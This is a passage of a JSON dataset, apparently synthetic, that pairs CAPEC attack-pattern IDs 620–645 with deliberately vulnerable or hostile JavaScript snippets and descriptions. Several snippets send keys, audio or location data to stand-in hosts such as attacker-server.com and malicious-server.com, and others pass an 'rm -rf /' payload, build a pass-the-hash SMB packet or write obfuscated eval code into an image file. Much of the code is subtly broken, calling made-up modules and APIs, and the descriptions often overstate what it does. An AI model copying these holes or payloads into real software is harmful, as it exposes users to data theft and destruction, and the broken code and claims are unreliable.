        "description": "This JavaScript code snippet demonstrates the CAPEC attack scenario where an attacker passively monitors the signal strength of the target's cellular RF signal or WiFi RF signal to identify the source location of the signal. The code uses the wifi and cellular modules to get the signal strength and sends the location data, including device ID, IMSI, and MAC address, to a WebSocket server without proper verification of the source of the communication channel, enforcement of message integrity during transmission, or protection of physical side channels. The code is vulnerable to CWE-201, CWE-1300, CWE-940, CWE-924, and CWE-432."
    },
    {
        "capec_id": "620",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateEncryption(clientSupportedAlgorithms) {\n  let selectedAlgorithm = 'aes-128-cbc'; // default to a weaker algorithm\n\n  if (clientSupportedAlgorithms.includes('aes-256-cbc')) {\n    // should select the stronger algorithm, but doesn't\n    console.log('Client supports stronger algorithm, but we\\'ll stick with the weaker one.');\n  }\n\n  return selectedAlgorithm;\n}\n\nfunction encryptData(data, key) {\n  const cipher = crypto.createCipher(negotiateEncryption(['aes-128-cbc', 'aes-256-cbc']), key);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nconst hardCodedKey = 'my_secret_key';\nconst sensitiveData = 'creditCardNumber=1234-5678-9012-3456';\n\nconst encryptedData = encryptData(sensitiveData, hardCodedKey);\nconsole.log('Encrypted data: ' + encryptedData);\n\n// store the encrypted data in a file or transmit it\nconst fs = require('fs');\nfs.writeFileSync('encrypted_data.txt', encryptedData, 'utf8');",
        "description": "This code snippet demonstrates the CAPEC of forcing the encryption level to be lowered. It includes CWEs 757 (Selection of Less-Secure Algorithm During Negotiation), 326 (Inadequate Encryption Strength), 321 (Use of Hard-coded Cryptographic Key), and 312 (Cleartext Storage of Sensitive Information). The code negotiates the encryption algorithm with the client, but always selects a weaker algorithm. It uses a hard-coded cryptographic key and stores sensitive information in cleartext before encryption. The encrypted data is then stored in a file, which may be accessible to unauthorized parties."
    },
    {
        "capec_id": "621",
        "code_snippet": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', (ws) => {\n  ws.on('message', (message) => {\n    // CWE-201: Insertion of Sensitive Information Into Sent Data\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    const sensitiveData = { username: 'admin', password: 'password' };\n    ws.send(JSON.stringify(sensitiveData));\n\n    // CWE-385: Covert Timing Channel\n    // CWE-516: DEPRECATED: Covert Timing Channel\n    const timingChannel = () => {\n      for (let i = 0; i < 100000; i++) {}\n      ws.send('Timing channel signal');\n    };\n    timingChannel();\n\n    // CWE-208: Observable Timing Discrepancy\n    const slowOperation = () => {\n      for (let i = 0; i < 1000000; i++) {}\n      ws.send('Slow operation complete');\n    };\n    slowOperation();\n  });\n});",
        "description": "This code snippet demonstrates the CAPEC of intercepting and logging encrypted transmissions to analyze metadata. It uses WebSockets to send sensitive data in cleartext, and includes covert timing channels and observable timing discrepancies that can be exploited by an attacker."
    },
    {
        "capec_id": "622",
        "code_snippet": "const crypto = require('crypto');\n\nconst key = crypto.randomBytes(32);\nconst cipher = crypto.createCipher('aes-256-cbc', key);\nlet encrypted = cipher.update('Top Secret Data', 'utf8', 'hex');\nencrypted += cipher.final('hex');\n\n// CWE-201: Insertion of Sensitive Information Into Sent Data\n// CWE-300: Channel Accessible by Non-Endpoint\nconst socket = require('socket.io')();\nsocket.emit('encryptedData', encrypted);\n\n// CWE-1300: Improper Protection of Physical Side Channels\n// CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n// CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nfunction processSensitiveData() {\n  // Perform cryptographic operations that can be monitored by an attacker\n  const decrypted = crypto.createDecipher('aes-256-cbc', key);\n  let decryptedData = decrypted.update(encrypted, 'hex', 'utf8');\n  decryptedData += decrypted.final('utf8');\n  console.log(decryptedData);\n}\nprocessSensitiveData();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of monitoring electromagnetic emanations to derive sensitive information. It uses a vulnerable cryptographic algorithm (CWE-327) and transmits sensitive data over an insecure channel (CWE-201 and CWE-300). The code also performs cryptographic operations that can be monitored by an attacker, making it vulnerable to electromagnetic fault injection attacks (CWE-1319) and physical side-channel attacks (CWE-1300)."
    },
    {
        "capec_id": "623",
        "code_snippet": "const crypto = require('crypto');\n\nfunction generateKey() {\n  const key = crypto.randomBytes(32);\n  document.getElementById('key-display').innerHTML = key.toString('hex');\n  // Emit a beep sound to indicate key generation\n  const beep = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAABAAgAZGF0YQAAAAAA');\n  beep.play();\n  // Send the key over an insecure channel\n  fetch('https://insecure-server.com/collect-key', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ key: key.toString('hex') })\n  });\n}\n\n// Call the generateKey function when the button is clicked\ndocument.getElementById('generate-key-btn').addEventListener('click', generateKey);",
        "description": "This code snippet demonstrates the CAPEC of Compromising Emanations by generating a cryptographic key and emitting a beep sound when the key is generated. The key is then sent over an insecure channel, violating CWE-201. The beep sound can be intercepted and analyzed to disclose the information processed by the device, violating CWE-1300. Additionally, the code does not contain sufficient protection mechanisms to prevent physical side channels from exposing sensitive information, violating CWE-1300. The use of an insecure channel to send the key also violates CWE-1320. Furthermore, the code is susceptible to electromagnetic fault injection attacks, violating CWE-1319, and may expose sensitive information during transient execution, violating CWE-1420."
    },
    {
        "capec_id": "624",
        "code_snippet": "const crypto = require('crypto');\n\nconst encrypt = (data, key) => {\n  const cipher = crypto.createCipher('aes-256-cbc', key);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n};\n\nconst key = 'my_secret_key';\nconst data = 'my_secret_data';\n\n// Simulating a voltage glitch\nconst glitch = () => {\n  // Intentionally introducing a fault in the encryption process\n  process.emitWarning('Voltage glitch detected!');\n  // Altering the physical environment\n  const temperature = 150; // Celsius, exceeding standard operating temperature\n  const clockGlitch = () => {\n    // Simulating a clock glitch\n    const originalClock = process.hrtime.bigint;\n    process.hrtime.bigint = () => originalClock() + 1000n;\n  };\n  clockGlitch();\n};\n\ntry {\n  encrypt(data, key);\n} catch (e) {\n  glitch();\n  console.log('Error: ' + e.message);\n}\n",
        "description": "This code snippet demonstrates a vulnerable encryption function in Node.js that is susceptible to voltage glitches and clock glitches, which can be exploited to derive secret key information. The code intentionally introduces a fault in the encryption process when a voltage glitch is detected, and alters the physical environment by exceeding standard operating temperatures. This code embodies the main idea of the CAPEC, which involves using disruptive signals or events to cause faulty behavior in electronic devices, and relates to CWEs 1247, 1248, 1256, 1319, 1332, 1334, 1338, and 1351."
    },
    {
        "capec_id": "625",
        "code_snippet": "const crypto = require('crypto');\n\nfunction vulnerableCryptoOperation() {\n  const key = crypto.randomBytes(32);\n  const cipher = crypto.createCipher('aes-256-cbc', key);\n  let encrypted = '';\n\n  // Simulating a clock glitch\n  const originalClockSpeed = process.clockSpeed;\n  process.clockSpeed = originalClockSpeed * 0.5;\n\n  try {\n    encrypted += cipher.update('Top Secret Data', 'utf8', 'hex');\n  } catch (e) {\n    // Ignore errors, potentially leaking sensitive information\n    console.error(e);\n  } finally {\n    process.clockSpeed = originalClockSpeed;\n  }\n\n  return encrypted;\n}\n\nvulnerableCryptoOperation();",
        "description": "This JavaScript code snippet demonstrates a vulnerable cryptographic operation susceptible to fault injection attacks. It simulates a clock glitch by temporarily reducing the clock speed, which can cause the cryptographic operation to produce faulty results, potentially leaking sensitive information. The code ignores errors, which can further exacerbate the vulnerability. This code is vulnerable to CWE-1247, CWE-1319, and CWE-1332."
    },
    {
        "capec_id": "626",
        "code_snippet": "const canvas = document.getElementById('canvas');\nconst ctx = canvas.getContext('2d');\n\nfunction getTouchData() {\n  return new Promise(resolve => {\n    canvas.addEventListener('touchstart', event => {\n      const touch = event.touches[0];\n      const x = touch.clientX;\n      const y = touch.clientY;\n      ctx.fillStyle = 'rgba(0,0,0,0.1)';\n      ctx.beginPath();\n      ctx.arc(x, y, 10, 0, 2 * Math.PI);\n      ctx.fill();\n      resolve({ x, y });\n    });\n  });\n}\n\nasync function collectTouchData() {\n  const touchData = [];\n  for (let i = 0; i < 10; i++) {\n    touchData.push(await getTouchData());\n  }\n  return touchData;\n}\n\nasync function analyzeTouchData() {\n  const touchData = await collectTouchData();\n  const pattern = touchData.reduce((acc, curr) => {\n    acc[curr.x] = (acc[curr.x] || 0) + 1;\n    return acc;\n  }, {});\n  console.log(pattern);\n}\n\nanalyzeTouchData();",
        "description": "This code snippet demonstrates a potential attack on a touchscreen device by collecting and analyzing touch data to reveal the password/passcode pattern. The code uses the HTML5 canvas element to capture touch events and store the coordinates of each touch. The `analyzeTouchData` function then reduces the collected data to a pattern, which could potentially be used to infer the user's password or passcode. This code embodies the CAPEC and CWEs by exploiting the lack of protection against physical side channels (CWE-1300), reflection attacks (CWE-301), and excessive attack surface (CWE-1125). Additionally, it highlights the potential for hardware reverse engineering (CWE-1278) and authentication bypass by capture-replay (CWE-294)."
    },
    {
        "capec_id": "627",
        "code_snippet": "const gpsReceiver = {\n  receiveSignal: function(signal) {\n    // CWE-940: No verification of signal source\n    if (signal.type === 'gps') {\n      // CWE-222: Truncation of security-relevant information\n      const truncatedSignal = signal.data.substring(0, 10);\n      // CWE-924: No message integrity check\n      const spoofedLocation = {\n        latitude: truncatedSignal.latitude,\n        longitude: truncatedSignal.longitude,\n        timestamp: new Date(truncatedSignal.timestamp)\n      };\n      // CWE-925: No verification of intent by broadcast receiver\n      this.broadcastReceiver(spoofedLocation);\n    }\n  },\n  broadcastReceiver: function(location) {\n    // CWE-294: Authentication bypass by capture-replay\n    const replayedSignal = {\n      type: 'gps',\n      data: location\n    };\n    this.receiveSignal(replayedSignal);\n  }\n};",
        "description": "A vulnerable GPS receiver implementation in JavaScript that is susceptible to spoofing attacks, violating CWE-940, CWE-222, CWE-924, CWE-925, and CWE-294."
    },
    {
        "capec_id": "628",
        "code_snippet": "const gpsSignal = {\n  timestamp: Date.now(),\n  location: { lat: 37.7749, lon: -122.4194 },\n  satellites: 10\n};\n\nconst spoofedSignal = {\n  timestamp: gpsSignal.timestamp,\n  location: { lat: 37.7859, lon: -122.4364 },\n  satellites: gpsSignal.satellites\n};\n\n// CWE-290: Authentication Bypass by Spoofing\nfunction authenticateSignal(signal) {\n  // No authentication or verification of signal source\n  return true;\n}\n\n// CWE-222: Truncation of Security-relevant Information\nfunction truncateSignal(signal) {\n  return {\n    timestamp: signal.timestamp,\n    location: { lat: signal.location.lat.toFixed(4), lon: signal.location.lon.toFixed(4) }\n  };\n}\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nfunction sendSignal(signal) {\n  const socket = new WebSocket('ws://attacker-server.com');\n  socket.send(JSON.stringify(signal));\n}\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nfunction receiveSignal(signal) {\n  // No verification of signal source\n  console.log('Received signal:', signal);\n}\n\n// CWE-924: Improper Enforcement of Message Integrity During Transmission\nfunction transmitSignal(signal) {\n  // No encryption or integrity checks\n  sendSignal(signal);\n}\n\nif (authenticateSignal(spoofedSignal)) {\n  const truncatedSignal = truncateSignal(spoofedSignal);\n  transmitSignal(truncatedSignal);\n}",
        "description": "This code snippet demonstrates a GPS spoofing attack, where an adversary broadcasts fake GPS signals to a target receiver. The fake signals are gradually increased in power and drawn away from the genuine signals, allowing the adversary to 'carry off' the target to a chosen location. The code includes vulnerabilities related to authentication bypass by spoofing, truncation of security-relevant information, incorrectly specified destination in a communication channel, improper verification of source of a communication channel, and improper enforcement of message integrity during transmission."
    },
    {
        "capec_id": "629",
        "code_snippet": "const fs = require('fs');\nlet resourceName = 'AUX';\nlet resource = fs.openSync(resourceName, 'w');\n\n// CWE-772: Missing Release of Resource after Effective Lifetime\n// The resource is not released after its effective lifetime has ended\n\nfunction processResource() {\n    // CWE-920: Improper Restriction of Power Consumption\n    // The function consumes excessive power without proper restriction\n    while (true) {\n        // CWE-67: Improper Handling of Windows Device Names\n        // The function does not handle Windows device names correctly\n        fs.writeSync(resource, 'Data');\n    }\n}\n\n// CWE-863: Incorrect Authorization\n// The function does not correctly perform authorization checks\nfunction authorizeAccess() {\n    return true;\n}\n\nif (authorizeAccess()) {\n    processResource();\n}",
        "description": "This code snippet demonstrates a deprecated attack pattern that combines multiple weaknesses. It fails to release a resource after its effective lifetime, consumes excessive power without proper restriction, improperly handles Windows device names, and incorrectly performs authorization checks. The code opens a file with a Windows device name, consumes excessive power in an infinite loop, and bypasses intended access restrictions."
    },
    {
        "capec_id": "630",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const userInput = req.query.url;\n  if (userInput) {\n    const typoDomain = userInput.replace('google', 'goggle');\n    res.redirect(`http://${typoDomain}.com`);\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a TypoSquatting attack. The express.js server accepts a user-controlled input 'url' and redirects the user to a typo domain 'goggle.com' instead of the intended 'google.com'. This is an example of CWE-601: URL Redirection to Untrusted Site ('Open Redirect') and CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages. The code also relates to CWE-290: Authentication Bypass by Spoofing, CWE-697: Incorrect Comparison, and CWE-115: Misinterpretation of Input, as it misinterprets the user's input and redirects to an untrusted site."
    },
    {
        "capec_id": "631",
        "code_snippet": "const dns = require('dns');\n\nfunction redirectUser(url) {\n  const hostname = new URL(url).hostname;\n  dns.reverse(hostname, (err, domains) => {\n    if (domains.includes('example.com')) {\n      // trusted domain\n      window.location.href = url;\n    } else {\n      // untrusted domain, but similar sounding\n      window.location.href = 'https://evil-website.com';\n    }\n  });\n}\n\n// user input\nconst userInput = 'examp1e.com';\nredirectUser('http://' + userInput);",
        "description": "This code snippet demonstrates a SoundSquatting attack, where an adversary registers a domain name that sounds the same as a trusted domain but has a different spelling. The code uses the 'dns' module to perform reverse DNS resolution on the user-input domain, and if it's similar to the trusted domain, it redirects the user to an untrusted site. This code embodies CWE-348 (Use of Less Trusted Source), CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action), CWE-486 (Comparison of Classes by Name), CWE-601 (URL Redirection to Untrusted Site), and CWE-290 (Authentication Bypass by Spoofing)."
    },
    {
        "capec_id": "632",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  const userInput = req.query.url;\n  const regex = new RegExp(userInput, 'i');\n  const trustedDomain = 'example.com';\n  if (regex.test(trustedDomain)) {\n    res.redirect(userInput);\n  } else {\n    res.send('Invalid URL');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that is susceptible to a homograph attack. The application uses a regular expression to validate user input, but the regular expression is not anchored, allowing an attacker to register a domain name with a homoglyph and redirect the user to a malicious site. The application also fails to properly neutralize invalid characters in the user input, making it vulnerable to encoded URI schemes and server-side request forgery."
    },
    {
        "capec_id": "633",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use('/', (req, res) => {\n  const token = req.header('Authorization');\n  if (token) {\n    const impersonatedUser = 'admin'; // hardcoded impersonated user\n    req.user = impersonatedUser;\n    next();\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  if (req.user === 'admin') {\n    // perform admin actions\n    res.send('Admin actions performed');\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism in a Node.js Express application. The code uses a hardcoded impersonated user ('admin') and assigns it to the req.user object when an Authorization token is provided in the request header. This allows an attacker to impersonate the admin user by simply providing a token, without proper authentication. The code then uses the impersonated user to perform admin actions, which can lead to unauthorized access and privilege escalation."
    },
    {
        "capec_id": "634",
        "code_snippet": "const microphone = navigator.mediaDevices.getUserMedia({ audio: true });\nconst socket = new WebSocket('wss://malicious-server.com');\n\nmicrophone.then(stream => {\n  const audioContext = new AudioContext();\n  const source = audioContext.createMediaStreamSource(stream);\n  const scriptProcessor = audioContext.createScriptProcessor(1024, 1, 1);\n\n  scriptProcessor.onaudioprocess = event => {\n    const audioData = event.inputBuffer.getChannelData(0);\n    const audioString = String.fromCharCode.apply(null, new Uint8Array(audioData));\n    socket.send(audioString);\n  };\n\n  source.connect(scriptProcessor);\n  scriptProcessor.connect(audioContext.destination);\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of exploiting audio and video functionalities to capture sensitive information. It uses the CWEs 267, 319, 1300, 497, and 1039 for context. The code requests access to the user's microphone, establishes a WebSocket connection to a malicious server, and sends the audio data in cleartext. This allows the adversary to capture sensitive information about the target, violating privilege definitions and exposing sensitive system information."
    },
    {
        "capec_id": "635",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processFile(file) {\n    const filePath = path.join(uploadDir, file.name);\n    fs.readFile(filePath, (err, data) => {\n        if (err) {\n            console.error(err);\n        } else {\n            // Process the file based on its extension\n            const fileExt = path.extname(file.name);\n            if (fileExt === '.txt') {\n                console.log('Processing text file...');\n            } else if (fileExt === '.exe') {\n                console.log('Processing executable file...');\n                // Execute the file (VULNERABLE CODE)\n                require('child_process').exec(filePath);\n            }\n        }\n    });\n}\n\n// Example usage\nconst uploadDir = './uploads/';\nconst file = { name: 'malicious.exe.txt' };\nprocessFile(file);",
        "description": "This code snippet demonstrates a vulnerable file processing functionality. It allows an attacker to upload a file with a malicious extension (e.g., .exe) and a benign-looking filename (e.g., .txt). The code uses the file extension to determine how to process the file, but it does not properly validate or restrict the file name or extension. As a result, an attacker can cause the code to execute the malicious file, leading to arbitrary code execution."
    },
    {
        "capec_id": "636",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-219: Storing sensitive data under web root\nconst sensitiveData = 'secretKey=1234567890';\nfs.writeFileSync(path.join(__dirname, 'public', 'image.jpg'), sensitiveData);\n\n// CWE-313: Storing sensitive data in cleartext in a file\nfs.writeFileSync(path.join(__dirname, 'config.txt'), 'databaseUsername=admin\\\ndatabasePassword=password123');\n\n// CWE-318: Storing sensitive data in cleartext in an executable\nconst executableContent = 'console.log(\\'Sensitive data: \\' + process.env.DATABASE_PASSWORD);';\nfs.writeFileSync(path.join(__dirname, 'executable.js'), executableContent);\n\n// CWE-506: Embedded malicious code\nconst maliciousCode = 'eval(String.fromCharCode(102, 117, 110, 99, 116, 105, 111, 110, 32, 97, 108, 101, 114, 116, 40, 34, 72, 101, 108, 108, 111, 44, 32, 87, 111, 114, 108, 100, 33, 34, 41, 59));';\nfs.writeFileSync(path.join(__dirname, 'image.jpg'), Buffer.from(maliciousCode, 'utf8'));\n\n// CWE-515: Covert storage channel\nconst covertChannel = ' '; // Initialize covert channel\nfor (let i = 0; i < 10; i++) {\n  covertChannel += String.fromCharCode(Math.floor(Math.random() * 256));\n}\nfs.writeFileSync(path.join(__dirname, 'covertChannel.txt'), covertChannel);\n",
        "description": "This code snippet demonstrates the CAPEC of storing malicious data or code in file metadata. It includes examples of CWE-219, CWE-313, CWE-318, CWE-506, and CWE-515. The code writes sensitive data to files, stores malicious code in an image file, and demonstrates a covert storage channel."
    },
    {
        "capec_id": "637",
        "code_snippet": "const clipboard = require('electron').clipboard;\n\nfunction copySensitiveData() {\n  const sensitiveInfo = 'username:password';\n  clipboard.writeText(sensitiveInfo);\n  console.log('Copied to clipboard: ' + sensitiveInfo);\n}\n\ncopySensitiveData();",
        "description": "JavaScript code snippet that demonstrates the CAPEC of exploiting an application that allows for the copying of sensitive data or information by collecting information copied to the clipboard. The code uses the Electron framework to access the clipboard and writes sensitive information (username and password) to it in cleartext, violating CWE-318 and CWE-317. The code also logs the sensitive information to the console, potentially exposing it to unauthorized actors, as described in CWE-497. Furthermore, the code does not properly handle the truncation of security-relevant information, as per CWE-222. Finally, the code defines a privilege (access to the clipboard) with unsafe actions (writing sensitive information), which is a violation of CWE-267."
    },
    {
        "capec_id": "638",
        "code_snippet": "const maliciousFirmware = {\n  mbrPayload: 'malicious_code_here',\n  infectSystem: function() {\n    // CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n    const untrustedCore = new UntrustedExecutionCore();\n    untrustedCore.enable();\n\n    // CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n    const volatileMemory = new VolatileMemory();\n    volatileMemory.write(this.mbrPayload);\n\n    // CWE-1277: Firmware Not Updateable\n    const nonUpdatableFirmware = new NonUpdatableFirmware();\n    nonUpdatableFirmware.flash(this.mbrPayload);\n\n    // CWE-1326: Missing Immutable Root of Trust in Hardware\n    const mutableHardware = new MutableHardware();\n    mutableHardware.setBootCode(this.mbrPayload);\n\n    // CWE-1220: Insufficient Granularity of Access Control\n    const broadAccessControl = new BroadAccessControl();\n    broadAccessControl.grantAccessToAll();\n  }\n};\nmaliciousFirmware.infectSystem();",
        "description": "This code snippet demonstrates the CAPEC of exploiting systems features and improperly protected firmware of hardware components to execute malicious code from within the Master Boot Record (MBR). It uses related CWEs to illustrate the vulnerabilities, including power-on of untrusted execution core, improper access control for volatile memory, non-updatable firmware, missing immutable root of trust in hardware, and insufficient granularity of access control."
    },
    {
        "capec_id": "639",
        "code_snippet": "const fs = require('fs');\n\n// CWE-552: Files or Directories Accessible to External Parties\nfs.writeFileSync('/tmp/sensitive_data.txt', 'username:password');\n\n// CWE-377: Insecure Temporary File\nconst tempFile = '/tmp/temporary_file.txt';\nfs.writeFileSync(tempFile, 'secret_key:123456');\n\n// CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\nfs.writeFileSync('/public/acl_file.txt', 'access_control_list');\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst systemInfo = process.env;\nfs.writeFileSync('/public/system_info.txt', JSON.stringify(systemInfo));\n\n// CWE-537: Java Runtime Error Message Containing Sensitive Information (Note: This CWE is specific to Java, but the concept applies to other languages as well)\ntry {\n  const sensitiveData = fs.readFileSync('/etc/passwd', 'utf8');\n  console.log(sensitiveData);\n} catch (e) {\n  console.error(e.message);\n}",
        "description": "This code snippet demonstrates the CAPEC of improperly protected files, allowing an adversary to access sensitive information. It includes examples of CWE-552 (accessible files), CWE-377 (insecure temporary files), CWE-529 (exposed access control list files), CWE-497 (exposed system information), and CWE-537 (sensitive information in error messages)."
    },
    {
        "capec_id": "640",
        "code_snippet": "const { fork } = require('child_process');\nconst maliciousCode = 'require(\"child_process\").exec(\"rm -rf /\");';\nconst legitimateProcess = fork('node', ['-e', `console.log('Legitimate process running');`]);\nlegitimateProcess.send(maliciousCode);\n\n// DLL injection example\nconst maliciousDLL = 'malicious.dll';\nconst legitimateProcessId = legitimateProcess.pid;\nconst dllInjection = require('dll-injection');\ndllInjection.injectDll(maliciousDLL, legitimateProcessId);\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC of process hijacking, where an adversary injects malicious code into a legitimate running process to evade detection defenses and escalate privileges. The code uses the 'child_process' module to fork a new process and send malicious code to be executed in the context of the legitimate process. Additionally, it includes an example of DLL injection, which is a type of process hijacking, using a fictional 'dll-injection' module."
    },
    {
        "capec_id": "641",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-427: Uncontrolled Search Path Element\nconst searchPath = ['C:\\Windows\\WinSxS', 'C:\\Program Files', 'C:\\'];\n\n// CWE-426: Untrusted Search Path\nconst dllName = 'myDLL.dll';\nlet dllPath;\nfor (let dir of searchPath) {\n    dllPath = path.join(dir, dllName);\n    if (fs.existsSync(dllPath)) {\n        break;\n    }\n}\n\n// CWE-706: Use of Incorrectly-Resolved Name or Reference\nconst dll = require(dllPath);\n\n// CWE-65: Windows Hard Link\n// CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n// An attacker can create a hard link to a malicious DLL in the search path\n// or use an alternate data stream to hide the malicious DLL\n\n// Load the DLL and execute a function\ndll.myFunction();",
        "description": "This code snippet demonstrates the CAPEC of DLL side-loading by searching for a DLL in a predefined set of directories. The code uses an uncontrolled search path, which can be exploited by an attacker to load a malicious DLL. The code also uses an untrusted search path, which can point to resources that are not under the product's direct control. Additionally, the code does not properly handle Windows hard links or alternate data streams, which can allow an attacker to cause the product to operate on unauthorized files."
    },
    {
        "capec_id": "642",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-732: Incorrect Permission Assignment for Critical Resource\nfs.chmodSync('/path/to/binary', '0777');\n\n// CWE-426: Untrusted Search Path\nconst searchPath = './';\nconst binaryName = 'binary';\nconst binaryPath = path.join(searchPath, binaryName);\n\n// CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nconst userInput = 'userInput';\nconst command = `chmod 777 ${binaryPath}`;\nrequire('child_process').exec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.log(`stderr: ${stderr}`);\n});\n\n// CWE-428: Unquoted Search Path or Element\nconst unquotedSearchPath = 'C:\\\\Program Files\\\\';\nconst unquotedBinaryName = 'binary.exe';\nconst unquotedBinaryPath = path.join(unquotedSearchPath, unquotedBinaryName);\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = 'console.log(\\'Malicious code executed\\');';\nfs.writeFileSync(unquotedBinaryPath, maliciousCode);",
        "description": "This code snippet demonstrates the CAPEC pattern of replacing binaries with malware by exploiting weak file system permissions. It includes CWE-732 by setting permissions to 0777, CWE-426 by using an untrusted search path, CWE-78 by injecting malicious code into an OS command, CWE-428 by using an unquoted search path, and CWE-506 by embedding malicious code in a binary."
    },
    {
        "capec_id": "643",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-267: Privilege Defined With Unsafe Actions\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n// CWE-427: Uncontrolled Search Path Element\n// CWE-40: Path Traversal: '\\\\UNC\\\\share\\\name\\' (Windows UNC Share)\n// CWE-552: Files or Directories Accessible to External Parties\n\nfunction searchSharedFolders(UNCPath) {\n  try {\n    const files = fs.readdirSync(UNCPath);\n    console.log(`Shared files in ${UNCPath}:`);\n    files.forEach(file => {\n      const filePath = path.join(UNCPath, file);\n      console.log(`  - ${filePath}`);\n    });\n  } catch (err) {\n    console.error(`Error accessing ${UNCPath}: ${err}`);\n  }\n}\n\n// Example usage:\nsearchSharedFolders('\\\\\\\\example\\\\share');",
        "description": "This JavaScript code snippet demonstrates the CAPEC by searching for shared folders and files on a Windows UNC share, potentially exposing sensitive information to unauthorized actors. The code uses the fs and path modules to read the contents of the shared folder, and logs the files found. This code embodies the CWEs by using a fixed search path that can be controlled by unintended actors, exposing sensitive information, and potentially allowing path traversal attacks."
    },
    {
        "capec_id": "644",
        "code_snippet": "const net = require('net');\nconst lmhash = '4phpcqbmmpmjq'; // stolen LM hash\nconst ntlmhash = '8846f7eaee8fb117ad06bdd830b7586c'; // stolen NTLM hash\n\nconst client = new net.Socket();\nclient.connect(445, 'target-system', () => {\n  const packet = Buffer.alloc(1024);\n  packet.writeUInt8(0x5c, 0); // SMB signature\n  packet.writeUInt8(0x00, 1); // SMB command (e.g., tree connect)\n  packet.writeUInt16LE(0x10, 2); // SMB flags (e.g., 0x10 for Unicode)\n  packet.writeUInt8(0x00, 4); // SMB flags2 (e.g., 0x00 for none)\n  packet.writeUInt16LE(0x00, 5); // SMB protocol (e.g., 0x00 for SMB 1.0)\n  packet.writeUInt8(0x00, 7); // SMB data offset\n  packet.writeUInt16LE(0x00, 8); // SMB data length\n  packet.writeUInt16LE(0x00, 10); // SMB data max buffer\n  packet.writeUInt16LE(0x00, 12); // SMB max multiplex\n  packet.writeUInt16LE(0x00, 14); // SMB virtual circuit\n  packet.writeUInt8(0x00, 16); // SMB security flags\n  packet.writeUInt8(0x03, 17); // SMB capabilities (e.g., 0x03 for LM and NTLM)\n  packet.writeUInt16LE(0x00, 18); // SMB system time\n  packet.writeUInt16LE(0x00, 20); // SMB system time zone\n  packet.writeUInt8(0x00, 22); // SMB challenge length\n  packet.write(lmhash, 23, 'hex'); // stolen LM hash\n  packet.write(ntlmhash, 39, 'hex'); // stolen NTLM hash\n  client.write(packet);\n});",
        "description": "JavaScript code snippet demonstrating the CAPEC of using stolen Windows domain credential hash values to access systems within the domain that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols. This code connects to a target system on port 445, constructs an SMB packet with the stolen LM and NTLM hashes, and sends it to the server to impersonate a legitimate user. CWEs 522, 836, 308, 294, and 520 are relevant to this vulnerability, as it involves insufficient protection of credentials, use of password hashes for authentication, single-factor authentication, and potential capture-replay attacks."
    },
    {
        "capec_id": "645",
        "code_snippet": "const kerberos = require('kerberos');\n\n// CWE-522: Insufficiently Protected Credentials\nconst ticket = 'stolen_ticket';\n\n// CWE-294: Authentication Bypass by Capture-replay\nconst capturedTicket = captureNetworkTraffic();\n\n// CWE-308: Use of Single-factor Authentication\nconst username = 'admin';\nconst password = 'password';\n\n// CWE-322: Key Exchange without Entity Authentication\nconst keyExchange = kerberos.keyExchange(username, password);\n\n// CWE-1292: Incorrect Conversion of Security Identifiers\nconst securityIdentifier = convertSecurityIdentifier(keyExchange);\n\n// Use the stolen ticket to authenticate\nkerberos.authenticate(ticket, (err, authenticated) => {\n  if (authenticated) {\n    console.log('Authenticated successfully!');\n  } else {\n    console.log('Authentication failed.');\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC of using stolen Kerberos tickets to access systems/resources that leverage the Kerberos authentication protocol. It uses related CWEs to highlight insecure practices, such as transmitting or storing authentication credentials insecurely, bypassing authentication through capture-replay, using single-factor authentication, performing key exchange without entity authentication, and incorrectly converting security identifiers."
    },
    {
        "capec_id": "646",
